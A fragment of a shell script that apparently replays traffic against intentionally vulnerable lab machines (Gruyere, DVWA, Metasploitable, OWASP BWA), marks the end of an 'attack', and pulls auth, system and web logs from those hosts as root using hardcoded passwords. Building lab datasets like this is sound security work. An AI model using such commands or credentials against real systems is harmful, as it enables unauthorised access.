#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
#     $'http://192.168.56.113/1142014131/login'
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newaccount.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
#     $'http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True'
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/'


# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/newsnippet.gtl'

# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/newsnippet2?snippet=Hey+everyone%21%21%21%21'
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/snippets.gtl'


# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/newsnippet.gtl'

# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/newsnippet2?snippet=Hey+everyone%21%21%21%21'
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
#     $'http://192.168.56.113/1142014131/snippets.gtl'


# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=admin&Submit=Submit' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=1234&Submit=Submit'







#End of attack
ifconfig $A1i down
ifconfig $A2i down
ifconfig $A3i down
ifconfig $U1i down
ifconfig $U2i down
ifconfig $U3i down
ifconfig $U4i down
ifconfig $U5i down


# #grab log files
# rm -rf lsa
# rm -rf metasploitable
# rm -rf zico
# rm -rf owaspbwa

# mkdir lsa
# mkdir metasploitable
# mkdir zico
# mkdir owaspbwa


# sshpass -p "owaspbwa" scp root@$OWASP:/var/log/auth.log ./owaspbwa/
# sshpass -p "owaspbwa" scp root@$OWASP:/var/log/syslog ./owaspbwa/
# sshpass -p "owaspbwa" scp root@$OWASP:/var/log/apache2/access.log ./owaspbwa/

# sshpass -p "potato" scp root@$ZC2:/var/log/auth.log ./zico/
# sshpass -p "potato" scp root@$ZC2:/var/log/syslog ./zico/
# sshpass -p "potato" scp root@$ZC2:/var/log/apache2/access.log ./zico/

# sshpass -p "potato" scp root@$LSA:/var/log/auth.log ./lsa/
# sshpass -p "potato" scp root@$LSA:/var/log/syslog ./lsa/
# sshpass -p "potato" scp root@$LSA:/var/log/apache2/access.log ./lsa/

# sshpass -p "potato" scp root@$MSF:/var/log/auth.log ./metasploitable/
# sshpass -p "potato" scp root@$MSF:/var/log/syslog ./metasploitable/
# sshpass -p "potato" scp root@$MSF:/var/log/apache2/access.log ./metasploitable/